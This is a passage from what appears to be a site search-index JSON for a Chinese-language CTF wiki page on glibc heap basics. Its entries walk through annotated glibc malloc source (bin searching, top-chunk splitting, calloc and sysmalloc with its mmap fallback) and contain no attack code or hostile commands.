chunk"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#chunk_2","text":"\u5982\u679c\u8d70\u5230\u4e86\u8fd9\u91cc\uff0c\u90a3\u8bf4\u660e\u5bf9\u4e8e\u7528\u6237\u6240\u9700\u7684 chunk\uff0c\u4e0d\u80fd\u76f4\u63a5\u4ece\u5176\u5bf9\u5e94\u7684\u5408\u9002\u7684 bin \u4e2d\u83b7\u53d6 chunk 1 \uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u6765\u67e5\u627e\u6bd4\u5f53\u524d bin \u66f4\u5927\u7684 fast bin \uff0c small bin \u6216\u8005 large bin\u3002 /* Search for a chunk by scanning bins, starting with next largest bin. This search is strictly by best-fit; i.e., the smallest (with ties going to approximately the least recently used) chunk that fits is selected. The bitmap avoids needing to check that most blocks are nonempty. The particular case of skipping all bins during warm-up phases when no chunks have been returned yet is faster than it might look. */ ++ idx ; // \u83b7\u53d6\u5bf9\u5e94\u7684bin bin = bin_at ( av , idx ); // \u83b7\u53d6\u5f53\u524d\u7d22\u5f15\u5728binmap\u4e2d\u7684block\u7d22\u5f15 // #define idx2block(i) ((i) >> BINMAPSHIFT) ,BINMAPSHIFT=5 // Binmap\u6309block\u7ba1\u7406\uff0c\u6bcf\u4e2ablock\u4e3a\u4e00\u4e2aint\uff0c\u517132\u4e2abit\uff0c\u53ef\u4ee5\u8868\u793a32\u4e2abin\u4e2d\u662f\u5426\u6709\u7a7a\u95f2chunk\u5b58\u5728 // \u6240\u4ee5\u8fd9\u91cc\u662f\u53f3\u79fb5 block = idx2block ( idx ); // \u83b7\u53d6\u5f53\u524d\u5757\u5927\u5c0f\u5bf9\u5e94\u7684\u6620\u5c04\uff0c\u8fd9\u91cc\u53ef\u4ee5\u5f97\u77e5\u76f8\u5e94\u7684bin\u4e2d\u662f\u5426\u6709\u7a7a\u95f2\u5757 map = av -> binmap [ block ]; // #define idx2bit(i) ((1U << ((i) & ((1U << BINMAPSHIFT) - 1)))) // \u5c06idx\u5bf9\u5e94\u7684\u6bd4\u7279\u4f4d\u8bbe\u7f6e\u4e3a1\uff0c\u5176\u5b83\u4f4d\u4e3a0 bit = idx2bit ( idx ); for (;;) {","title":"\u5bfb\u627e\u8f83\u5927 chunk"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#map","text":"/* Skip rest of block if there are no more set bits in this block. */ // \u5982\u679cbit>map\uff0c\u5219\u8868\u793a\u8be5 map \u4e2d\u6ca1\u6709\u6bd4\u5f53\u524d\u6240\u9700\u8981chunk\u5927\u7684\u7a7a\u95f2\u5757 // \u5982\u679cbit\u4e3a0\uff0c\u90a3\u4e48\u8bf4\u660e\uff0c\u4e0a\u9762idx2bit\u5e26\u5165\u7684\u53c2\u6570\u4e3a0\u3002 if ( bit > map || bit == 0 ) { do { // \u5bfb\u627e\u4e0b\u4e00\u4e2ablock\uff0c\u76f4\u5230\u5176\u5bf9\u5e94\u7684map\u4e0d\u4e3a0\u3002 // \u5982\u679c\u5df2\u7ecf\u4e0d\u5b58\u5728\u7684\u8bdd\uff0c\u90a3\u5c31\u53ea\u80fd\u4f7f\u7528top chunk\u4e86 if ( ++ block >= BINMAPSIZE ) /* out of bins */ goto use_top ; } while (( map = av -> binmap [ block ]) == 0 ); // \u83b7\u53d6\u5176\u5bf9\u5e94\u7684bin\uff0c\u56e0\u4e3a\u8be5map\u4e2d\u7684chunk\u5927\u5c0f\u90fd\u6bd4\u6240\u9700\u7684chunk\u5927\uff0c\u800c\u4e14 // map\u672c\u8eab\u4e0d\u4e3a0\uff0c\u6240\u4ee5\u5fc5\u7136\u5b58\u5728\u6ee1\u8db3\u9700\u6c42\u7684chunk\u3002 bin = bin_at ( av , ( block << BINMAPSHIFT )); bit = 1 ; }","title":"\u627e\u5230\u4e00\u4e2a\u5408\u9002\u7684 MAP"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#bin_1","text":"/* Advance to bin with set bit. There must be one. */ // \u4ece\u5f53\u524dmap\u7684\u6700\u5c0f\u7684bin\u4e00\u76f4\u627e\uff0c\u76f4\u5230\u627e\u5230\u5408\u9002\u7684bin\u3002 // \u8fd9\u91cc\u662f\u4e00\u5b9a\u5b58\u5728\u7684 while (( bit & map ) == 0 ) { bin = next_bin ( bin ); bit <<= 1 ; assert ( bit != 0 ); }","title":"\u627e\u5230\u5408\u9002\u7684 BIN"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#chunk_3","text":"/* Inspect the bin. It is likely to be non-empty */ // \u83b7\u53d6\u5bf9\u5e94\u7684bin victim = last ( bin ); /* If a false alarm (empty bin), clear the bit. */ // \u5982\u679cvictim=bin\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u5c06map\u5bf9\u5e94\u7684\u4f4d\u6e050\uff0c\u7136\u540e\u83b7\u53d6\u4e0b\u4e00\u4e2abin // \u8fd9\u79cd\u60c5\u51b5\u53d1\u751f\u7684\u6982\u7387\u5e94\u8be5\u5f88\u5c0f\u3002 if ( victim == bin ) { av -> binmap [ block ] = map &= ~ bit ; /* Write through */ bin = next_bin ( bin ); bit <<= 1 ; }","title":"\u7b80\u5355\u68c0\u67e5 CHUNK"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#chunk_4","text":"else { // \u83b7\u53d6\u5bf9\u5e94victim\u7684\u5927\u5c0f size = chunksize ( victim ); /* We know the first chunk in this bin is big enough to use. */ assert (( unsigned long ) ( size ) >= ( unsigned long ) ( nb )); // \u8ba1\u7b97\u5206\u5272\u540e\u5269\u4f59\u7684\u5927\u5c0f remainder_size = size - nb ; /* unlink */ unlink ( av , victim , bck , fwd ); /* Exhaust */ // \u5982\u679c\u5206\u5272\u540e\u4e0d\u591f\u4e00\u4e2achunk\u600e\u4e48\u529e\uff1f if ( remainder_size < MINSIZE ) { set_inuse_bit_at_offset ( victim , size ); if ( av != & main_arena ) set_non_main_arena ( victim ); } /* Split */ // \u5982\u679c\u591f\uff0c\u5c3d\u7ba1\u5206\u5272 else { // \u8ba1\u7b97\u5269\u4f59\u7684chunk\u7684\u504f\u79fb remainder = chunk_at_offset ( victim , nb ); /* We cannot assume the unsorted list is empty and therefore have to perform a complete insert here. */ // \u5c06\u5269\u4f59\u7684chunk\u63d2\u5165\u5230unsorted bin\u4e2d bck = unsorted_chunks ( av ); fwd = bck -> fd ; if ( __glibc_unlikely ( fwd -> bk != bck )) { errstr = \"malloc(): corrupted unsorted chunks 2\" ; goto errout ; } remainder -> bk = bck ; remainder -> fd = fwd ; bck -> fd = remainder ; fwd -> bk = remainder ; /* advertise as last remainder */ // \u5982\u679c\u5728small bin\u8303\u56f4\u5185\uff0c\u5c31\u5c06\u5176\u6807\u8bb0\u4e3aremainder if ( in_smallbin_range ( nb )) av -> last_remainder = remainder ; if ( ! in_smallbin_range ( remainder_size )) { remainder -> fd_nextsize = NULL ; remainder -> bk_nextsize = NULL ; } // \u8bbe\u7f6evictim\u7684\u4f7f\u7528\u72b6\u6001 set_head ( victim , nb | PREV_INUSE | ( av != & main_arena ? NON_MAIN_ARENA : 0 )); // \u8bbe\u7f6eremainder\u7684\u4f7f\u7528\u72b6\u6001\uff0c\u8fd9\u91cc\u662f\u4e3a\u4ec0\u4e48\u5462\uff1f set_head ( remainder , remainder_size | PREV_INUSE ); // \u8bbe\u7f6eremainder\u7684\u5927\u5c0f set_foot ( remainder , remainder_size ); } // \u68c0\u67e5 check_malloced_chunk ( av , victim , nb ); // chunk\u72b6\u6001\u8f6c\u6362\u5230mem\u72b6\u6001 void * p = chunk2mem ( victim ); // \u5982\u679c\u8bbe\u7f6e\u4e86perturb_type, \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff alloc_perturb ( p , bytes ); return p ; }","title":"\u771f\u6b63\u53d6\u51fa CHUNK"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#top-chunk_1","text":"**\u5982\u679c\u6240\u6709\u7684 bin \u4e2d\u7684 chunk \u90fd\u6ca1\u6709\u529e\u6cd5\u76f4\u63a5\u6ee1\u8db3\u8981\u6c42\uff08\u5373\u4e0d\u5408\u5e76\uff09\uff0c\u6216\u8005\u8bf4\u90fd\u6ca1\u6709\u7a7a\u95f2\u7684 chunk\u3002**\u90a3\u4e48\u6211\u4eec\u5c31\u53ea\u80fd\u4f7f\u7528 top chunk \u4e86\u3002 use_top : /* If large enough, split off the chunk bordering the end of memory (held in av->top). Note that this is in accord with the best-fit search rule. In effect, av->top is treated as larger (and thus less well fitting) than any other available chunk since it can be extended to be as large as necessary (up to system limitations). We require that av->top always exists (i.e., has size >= MINSIZE) after initialization, so if it would otherwise be exhausted by current request, it is replenished. (The main reason for ensuring it exists is that we may need MINSIZE space to put in fenceposts in sysmalloc.) */ // \u83b7\u53d6\u5f53\u524d\u7684top chunk\uff0c\u5e76\u8ba1\u7b97\u5176\u5bf9\u5e94\u7684\u5927\u5c0f victim = av -> top ; size = chunksize ( victim ); // \u5982\u679c\u5206\u5272\u4e4b\u540e\uff0ctop chunk \u5927\u5c0f\u4ecd\u7136\u6ee1\u8db3 chunk \u7684\u6700\u5c0f\u5927\u5c0f\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u5206\u5272\u3002 if (( unsigned long ) ( size ) >= ( unsigned long ) ( nb + MINSIZE )) { remainder_size = size - nb ; remainder = chunk_at_offset ( victim , nb ); av -> top = remainder ; // \u8fd9\u91cc\u8bbe\u7f6e PREV_INUSE \u662f\u56e0\u4e3a top chunk \u524d\u9762\u7684 chunk \u5982\u679c\u4e0d\u662f fastbin\uff0c\u5c31\u5fc5\u7136\u4f1a\u548c // top chunk \u5408\u5e76\uff0c\u6240\u4ee5\u8fd9\u91cc\u8bbe\u7f6e\u4e86 PREV_INUSE\u3002 set_head ( victim , nb | PREV_INUSE | ( av != & main_arena ? NON_MAIN_ARENA : 0 )); set_head ( remainder , remainder_size | PREV_INUSE ); check_malloced_chunk ( av , victim , nb ); void * p = chunk2mem ( victim ); alloc_perturb ( p , bytes ); return p ; } // \u5426\u5219\uff0c\u5224\u65ad\u662f\u5426\u6709 fast chunk /* When we are using atomic ops to free fast chunks we can get here for all block sizes. */ else if ( have_fastchunks ( av )) { // \u5148\u6267\u884c\u4e00\u6b21fast bin\u7684\u5408\u5e76 malloc_consolidate ( av ); /* restore original bin index */ // \u5224\u65ad\u9700\u8981\u7684chunk\u662f\u5728small bin\u8303\u56f4\u5185\u8fd8\u662flarge bin\u8303\u56f4\u5185 // \u5e76\u8ba1\u7b97\u5bf9\u5e94\u7684\u7d22\u5f15 // \u7b49\u5f85\u4e0b\u6b21\u518d\u770b\u770b\u662f\u5426\u53ef\u4ee5 if ( in_smallbin_range ( nb )) idx = smallbin_index ( nb ); else idx = largebin_index ( nb ); }","title":"\u4f7f\u7528 top chunk"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#_19","text":"\u5982\u679c\u5806\u5185\u5b58\u4e0d\u591f\uff0c\u6211\u4eec\u5c31\u9700\u8981\u4f7f\u7528 sysmalloc \u6765\u7533\u8bf7\u5185\u5b58\u4e86\u3002 /* Otherwise, relay to handle system-dependent cases */ // \u5426\u5219\u7684\u8bdd\uff0c\u6211\u4eec\u5c31\u53ea\u80fd\u4ece\u7cfb\u7edf\u4e2d\u518d\u6b21\u7533\u8bf7\u4e00\u70b9\u5185\u5b58\u4e86\u3002 else { void * p = sysmalloc ( nb , av ); if ( p != NULL ) alloc_perturb ( p , bytes ); return p ; }","title":"\u5806\u5185\u5b58\u4e0d\u591f"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#_libc_calloc","text":"calloc \u4e5f\u662f libc \u4e2d\u7684\u4e00\u79cd\u7533\u8bf7\u5185\u5b58\u5757\u7684\u51fd\u6570\u3002\u5728 libc \u4e2d\u7684\u5c01\u88c5\u4e3a _libc_calloc \uff0c\u5177\u4f53\u4ecb\u7ecd\u5982\u4e0b /* calloc(size_t n_elements, size_t element_size); Returns a pointer to n_elements * element_size bytes, with all locations set to zero. */ void * __libc_calloc ( size_t , size_t ); 2020.07.08 \u4e0b\u9762\u5927\u6982\u6d4f\u89c8\u4e00\u4e0b\u672a\u4ed4\u7ec6\u54c1\u5473","title":"_libc_calloc"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#sysmalloc","text":"\u6b63\u5982\u8be5\u51fd\u6570\u5934\u7684\u6ce8\u91ca\u6240\u8a00\uff0c\u8be5\u51fd\u6570\u7528\u4e8e\u5f53\u524d\u5806\u5185\u5b58\u4e0d\u8db3\u65f6\uff0c\u9700\u8981\u5411\u7cfb\u7edf\u7533\u8bf7\u66f4\u591a\u7684\u5185\u5b58\u3002 /* sysmalloc handles malloc cases requiring more memory from the system. On entry, it is assumed that av->top does not have enough space to service request for nb bytes, thus requiring that av->top be extended or replaced. */","title":"sysmalloc"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#_20","text":"static void * sysmalloc ( INTERNAL_SIZE_T nb , mstate av ) { mchunkptr old_top ; /* incoming value of av->top */ INTERNAL_SIZE_T old_size ; /* its size */ char * old_end ; /* its end address */ long size ; /* arg to first MORECORE or mmap call */ char * brk ; /* return value from MORECORE */ long correction ; /* arg to 2nd MORECORE call */ char * snd_brk ; /* 2nd return val */ INTERNAL_SIZE_T front_misalign ; /* unusable bytes at front of new space */ INTERNAL_SIZE_T end_misalign ; /* partial page left at end of new space */ char * aligned_brk ; /* aligned offset into brk */ mchunkptr p ; /* the allocated/returned chunk */ mchunkptr remainder ; /* remainder frOm allocation */ unsigned long remainder_size ; /* its size */ size_t pagesize = GLRO ( dl_pagesize ); bool tried_mmap = false ; \u6211\u4eec\u53ef\u4ee5\u4e3b\u8981\u5173\u6ce8\u4e00\u4e0b pagesize \uff0c\u5176 #ifndef EXEC_PAGESIZE #define EXEC_PAGESIZE 4096 #endif # define GLRO(name) _##name size_t _dl_pagesize = EXEC_PAGESIZE ; \u6240\u4ee5\uff0c pagesize=4096=0x1000 \u3002","title":"\u57fa\u672c\u5b9a\u4e49"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#mmap_1","text":"\u6b63\u5982\u5f00\u5934\u6ce8\u91ca\u6240\u8a00\u5982\u679c\u6ee1\u8db3\u5982\u4e0b\u4efb\u4f55\u4e00\u79cd\u6761\u4ef6 \u6ca1\u6709\u5206\u914d\u5806\u3002 \u7533\u8bf7\u7684\u5185\u5b58\u5927\u4e8e mp_.mmap_threshold \uff0c\u5e76\u4e14 mmap \u7684\u6570\u91cf\u5c0f\u4e8e\u6700\u5927\u503c\uff0c\u5c31\u53ef\u4ee5\u5c1d\u8bd5\u4f7f\u7528 mmap\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u4e34\u754c\u503c\u4e3a static struct malloc_par mp_ = { . top_pad = DEFAULT_TOP_PAD , . n_mmaps_max = DEFAULT_MMAP_MAX , . mmap_threshold = DEFAULT_MMAP_THRESHOLD , . trim_threshold = DEFAULT_TRIM_THRESHOLD , #define NARENAS_FROM_NCORES(n) ((n) * (sizeof(long) == 4 ? 2 : 8)) . arena_test = NARENAS_FROM_NCORES ( 1 ) #if USE_TCACHE , . tcache_count = TCACHE_FILL_COUNT , . tcache_bins = TCACHE_MAX_BINS , . tcache_max_bytes = tidx2usize ( TCACHE_MAX_BINS - 1 ), . tcache_unsorted_limit = 0 /* No limit. */ #endif }; DEFAULT_MMAP_THRESHOLD \u4e3a 128*1024 \u5b57\u8282\uff0c\u5373 128 K\u3002 #ifndef DEFAULT_MMAP_THRESHOLD #define DEFAULT_MMAP_THRESHOLD DEFAULT_MMAP_THRESHOLD_MIN #endif /* MMAP_THRESHOLD_MAX and _MIN are the bounds on the dynamically adjusted MMAP_THRESHOLD. */ #ifndef DEFAULT_MMAP_THRESHOLD_MIN #define DEFAULT_MMAP_THRESHOLD_MIN (128 * 1024) #endif #ifndef DEFAULT_MMAP_THRESHOLD_MAX /* For 32-bit platforms we cannot increase the maximum mmap threshold much because it is also the minimum value for the maximum heap size and its alignment. Going above 512k (i.e., 1M for new heaps) wastes too much address space. */ #if __WORDSIZE == 32 #define DEFAULT_MMAP_THRESHOLD_MAX (512 * 1024) #else #define DEFAULT_MMAP_THRESHOLD_MAX (4 * 1024 * 1024 * sizeof(long)) #endif #endif \u4e0b\u9762\u4e3a\u8fd9\u90e8\u5206\u4ee3\u7801\uff0c\u76ee\u524d\u4e0d\u662f\u6211\u4eec\u5173\u5fc3\u7684\u91cd\u70b9\uff0c\u53ef\u4ee5\u6682\u65f6\u8df3\u8fc7\u3002 /* If have mmap, and the request size meets the mmap threshold, and the system supports mmap, and there are few enough currently allocated mmapped regions, try to directly map this request rather than expanding top. */ if ( av == NULL || (( unsigned long )( nb ) >= ( unsigned long )( mp_ . mmap_threshold ) && ( mp_ . n_mmaps < mp_ . n_mmaps_max ))) { char * mm ; /* return value from mmap call*/ try_mmap : /* Round up size to nearest page. For mmapped chunks, the overhead is one SIZE_SZ unit larger than for normal chunks, because there is no following chunk whose prev_size field could be used. See the front_misalign handling below, for glibc there is no need for further alignments unless we have have high alignment. */ if ( MALLOC_ALIGNMENT == 2 * SIZE_SZ ) size = ALIGN_UP ( nb + SIZE_SZ , pagesize ); else size = ALIGN_UP ( nb + SIZE_SZ + MALLOC_ALIGN_MASK , pagesize ); tried_mmap = true ; /* Don't try if size wraps around 0 */ if (( unsigned long )( size ) > ( unsigned long )( nb )) { mm = ( char * )( MMAP ( 0 , size , PROT_READ | PROT_WRITE , 0 )); if ( mm != MAP_FAILED ) { /* The offset to the start of the mmapped region is stored in the prev_size field of the chunk. This allows us to adjust returned start address to meet alignment requirements here and in memalign(), and still be able to compute proper address argument for later munmap in free() and realloc(). */ if ( MALLOC_ALIGNMENT == 2 * SIZE_SZ ) { /* For glibc, chunk2mem increases the address by 2*SIZE_SZ and MALLOC_ALIGN_MASK is 2*SIZE_SZ-1. Each mmap'ed area is page aligned and therefore definitely MALLOC_ALIGN_MASK-aligned. */ assert ((( INTERNAL_SIZE_T ) chunk2mem ( mm ) & MALLOC_ALIGN_MASK ) == 0 ); front_misalign = 0 ; } else front_misalign = ( INTERNAL_SIZE_T ) chunk2mem ( mm ) & MALLOC_ALIGN_MASK ; if ( front_misalign > 0 ) { correction = MALLOC_ALIGNMENT - front_misalign ; p = ( mchunkptr )( mm + correction ); set_prev_size ( p , correction ); set_head ( p , ( size - correction ) | IS_MMAPPED ); } else { p = ( mchunkptr ) mm ; set_prev_size ( p , 0 ); set_head ( p , size | IS_MMAPPED ); } /* update statistics */ int new = atomic_exchange_and_add ( & mp_ . n_mmaps , 1 ) + 1 ; atomic_max ( & mp_ . max_n_mmaps , new ); unsigned long sum ; sum = atomic_exchange_and_add ( & mp_ . mmapped_mem , size ) + size ; atomic_max ( & mp_ . max_mmapped_mem , sum ); check_chunk ( av , p ); return chunk2mem ( p ); } } }","title":"\u8003\u8651 mmap"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#mmap_2","text":"/* There are no usable arenas and mmap also failed. */ if (av == NULL) return 0; \u5982\u679c\u662f\u8fd9\u4e24\u79cd\u60c5\u51b5\u4e2d\u7684\u4efb\u4f55\u4e00\u79cd\uff0c\u5176\u5b9e\u5c31\u53ef\u4ee5\u9000\u51fa\u4e86\u3002\u3002","title":"mmap \u5931\u8d25\u6216\u8005\u672a\u5206\u914d\u5806"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#_21","text":"/* Record incoming configuration of top */ old_top = av -> top ; old_size = chunksize ( old_top ); old_end = ( char * )( chunk_at_offset ( old_top , old_size )); brk = snd_brk = ( char * )( MORECORE_FAILURE );","title":"\u8bb0\u5f55\u65e7\u5806\u4fe1\u606f"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#1","text":"/* If not the first time through, we require old_size to be at least MINSIZE and to have prev_inuse set. */ assert (( old_top == initial_top ( av ) && old_size == 0 ) || (( unsigned long )( old_size ) >= MINSIZE && prev_inuse ( old_top ) && (( unsigned long ) old_end & ( pagesize - 1 )) == 0 )); \u8fd9\u4e2a\u68c0\u67e5\u8981\u6c42\u6ee1\u8db3\u5176\u4e2d\u4efb\u4f55\u4e00\u4e2a\u6761\u4ef6 old_top == initial_top(av) && old_size == 0 \uff0c\u5373\u5982\u679c\u662f\u7b2c\u4e00\u6b21\u7684\u8bdd\uff0c\u5806\u7684\u5927\u5c0f\u9700\u8981\u662f 0\u3002 \u65b0\u7684\u5806\uff0c\u90a3\u4e48 (unsigned long)(old_size) >= MINSIZE && prev_inuse(old_top) \uff0c\u5806\u7684\u5927\u5c0f\u5e94\u8be5\u4e0d\u5c0f\u4e8e MINSIZE \uff0c\u5e76\u4e14\u524d\u4e00\u4e2a\u5806\u5757\u5e94\u8be5\u5904\u4e8e\u4f7f\u7528\u4e2d\u3002 ((unsigned long)old_end & (pagesize - 1)) == 0) \uff0c\u5806\u7684\u7ed3\u675f\u5730\u5740\u5e94\u8be5\u662f\u9875\u5bf9\u9f50\u7684\uff0c\u7531\u4e8e\u9875\u5bf9\u9f50\u7684\u5927\u5c0f\u9ed8\u8ba4\u662f 0x1000\uff0c\u6240\u4ee5\u4f4e 12 \u4e2a\u6bd4\u7279\u9700\u8981\u4e3a 0\u3002","title":"\u68c0\u67e5\u65e7\u5806\u4fe1\u606f 1"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#2","text":"/* Precondition: not enough current space to satisfy nb request */ assert (( unsigned long )( old_size ) < ( unsigned long )( nb + MINSIZE )); \u6839\u636e malloc \u4e2d\u7684\u5b9a\u4e49 static void * _int_malloc ( mstate av , size_t bytes ) { INTERNAL_SIZE_T nb ; /* normalized request size */ nb \u5e94\u8be5\u662f\u5df2\u7ecf\u52a0\u4e0a chunk \u5934\u90e8\u7684\u5b57\u8282\uff0c\u4e3a\u4ec0\u4e48\u8fd8\u8981\u52a0\u4e0a MINSIZE \u5462\uff1f\u8fd9\u662f\u56e0\u4e3a top chunk \u7684\u5927\u5c0f\u5e94\u8be5\u81f3\u5c11\u9884\u7559 MINSIZE \u7a7a\u95f4\uff0c\u4ee5\u4fbf\u4e8e\u5408\u5e76\u3002","title":"\u68c0\u67e5\u65e7\u5806\u4fe1\u606f 2"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#main_arena","text":"\u8fd9\u91cc\u6682\u65f6\u4e0d\u662f\u5173\u5fc3\u7684\u91cd\u70b9\uff0c\u6682\u4e14\u4e0d\u5206\u6790\u3002 if ( av != & main_arena ) { heap_info * old_heap , * heap ; size_t old_heap_size ; /* First try to extend the current heap. */ old_heap = heap_for_ptr ( old_top ); old_heap_size = old_heap -> size ; if (( long )( MINSIZE + nb - old_size ) > 0 && grow_heap ( old_heap , MINSIZE + nb - old_size ) == 0 ) { av -> system_mem += old_heap -> size - old_heap_size ; set_head ( old_top , ((( char * ) old_heap + old_heap -> size ) - ( char * ) old_top ) | PREV_INUSE ); } else if (( heap = new_heap ( nb + ( MINSIZE + sizeof ( * heap )), mp_ . top_pad ))) { /* Use a newly allocated heap. */ heap -> ar_ptr = av ; heap -> prev = old_heap ; av -> system_mem += heap -> size ; /* Set up the new top. */ top ( av ) = chunk_at_offset ( heap , sizeof ( * heap )); set_head ( top ( av ), ( heap -> size - sizeof ( * heap )) | PREV_INUSE ); /* Setup fencepost and free the old top chunk with a multiple of MALLOC_ALIGNMENT in size. */ /* The fencepost takes at least MINSIZE bytes, because it might become the top chunk again later. Note that a footer is set up, too, although the chunk is marked in use. */ old_size = ( old_size - MINSIZE ) & ~ MALLOC_ALIGN_MASK ; set_head ( chunk_at_offset ( old_top , old_size + 2 * SIZE_SZ ), 0 | PREV_INUSE ); if ( old_size >= MINSIZE ) { set_head ( chunk_at_offset ( old_top , old_size ), ( 2 * SIZE_SZ ) | PREV_INUSE ); set_foot ( chunk_at_offset ( old_top , old_size ), ( 2 * SIZE_SZ )); set_head ( old_top , old_size | PREV_INUSE | NON_MAIN_ARENA ); _int_free ( av , old_top , 1 ); } else { set_head ( old_top , ( old_size + 2 * SIZE_SZ ) | PREV_INUSE ); set_foot ( old_top , ( old_size + 2 * SIZE_SZ )); } } else if ( ! tried_mmap ) /* We can at least try to use to mmap memory. */ goto try_mmap ; }","title":"\u975e main_arena"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#main_arena_1","text":"","title":"Main_arena \u5904\u7406"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#_22","text":"\u8ba1\u7b97\u53ef\u4ee5\u6ee1\u8db3\u8bf7\u6c42\u7684\u5185\u5b58\u5927\u5c0f\u3002 else { /* av == main_arena */ /* Request enough space for nb + pad + overhead */ size = nb + mp_ . top_pad + MINSIZE ; \u9ed8\u8ba4\u60c5\u51b5\u4e0b top_pad \u5b9a\u4e49\u4e3a #ifndef DEFAULT_TOP_PAD # define DEFAULT_TOP_PAD 131072 #endif \u5373 131072 \u5b57\u8282\uff0c0x20000 \u5b57\u8282\u3002","title":"\u8ba1\u7b97\u5185\u5b58"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#_23","text":"\u5982\u679c\u6211\u4eec\u5e0c\u671b\u5806\u7684\u7a7a\u95f4\u8fde\u7eed\u7684\u8bdd\uff0c\u90a3\u4e48\u5176\u5b9e\u53ef\u4ee5\u590d\u7528\u4e4b\u524d\u7684\u5185\u5b58\u3002 /* If contiguous, we can subtract out existing space that we hope to combine with new space. We add it back later only if we don't actually get contiguous space. */ if ( contiguous ( av )) size -= old_size ;","title":"\u662f\u5426\u8fde\u7eed"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#_24","text":"/* Round to a multiple of page size. If MORECORE is not contiguous, this ensures that we only call it with whole-page arguments. And if MORECORE is contiguous and this is not first time through, this preserves page-alignment of previous calls. Otherwise, we correct to page-align below. */ size = ALIGN_UP ( size , pagesize );","title":"\u5bf9\u9f50\u9875\u5927\u5c0f"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#_25","text":"/* Don't try to call MORECORE if argument is so big as to appear negative. Note that since mmap takes size_t arg, it may succeed below even if we cannot call MORECORE. */ if ( size > 0 ) { brk = ( char * )( MORECORE ( size )); LIBC_PROBE ( memory_sbrk_more , 2 , brk , size ); }","title":"\u7533\u8bf7\u5185\u5b58"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#_26","text":"if ( brk != ( char * )( MORECORE_FAILURE )) { /* Call the `morecore' hook if necessary. */ void ( * hook )( void ) = atomic_forced_read ( __after_morecore_hook ); if ( __builtin_expect ( hook != NULL , 0 )) ( * hook )(); } \u8fd9\u91cc\u7adf\u7136\u8c03\u7528\u4e86\u4e00\u4e2a hook\uff0c\u6709\u70b9\u610f\u601d\u3002","title":"\u53ef\u80fd\u6210\u529f"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#_27","text":"\u5931\u8d25\uff0c\u8003\u8651 mmap\u3002 else { /* If have mmap, try using it as a backup when MORECORE fails or cannot be used. This is worth doing on systems that have \"holes\" in address space, so sbrk cannot extend to give contiguous space, but space is available elsewhere. Note that we ignore mmap max count and threshold limits, since the space will not be used as a segregated mmap region. */ /* Cannot merge with old top, so add its size back in */ if ( contiguous ( av )) size = ALIGN_UP ( size + old_size , pagesize ); /* If we are relying on mmap as backup, then use larger units */ if (( unsigned long )( size ) < ( unsigned long )( MMAP_AS_MORECORE_SIZE )) size = MMAP_AS_MORECORE_SIZE ; /* Don't try if size wraps around 0 */ if (( unsigned long )( size ) > ( unsigned long )( nb )) { char * mbrk = ( char * )( MMAP ( 0 , size , PROT_READ | PROT_WRITE , 0 )); if ( mbrk != MAP_FAILED ) { /* We do not need, and cannot use, another sbrk call to find end */ brk = mbrk ; snd_brk = brk + size ; /* Record that we no longer have a contiguous sbrk region. After the first time mmap is used as backup, we do not ever rely on contiguous space since this could incorrectly bridge regions. */ set_noncontiguous ( av ); } } }","title":"\u5931\u8d25"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#_28","text":"if ( brk != ( char * )( MORECORE_FAILURE )) { if ( mp_ . sbrk_base == 0 ) mp_ . sbrk_base = brk ; av -> system_mem += size 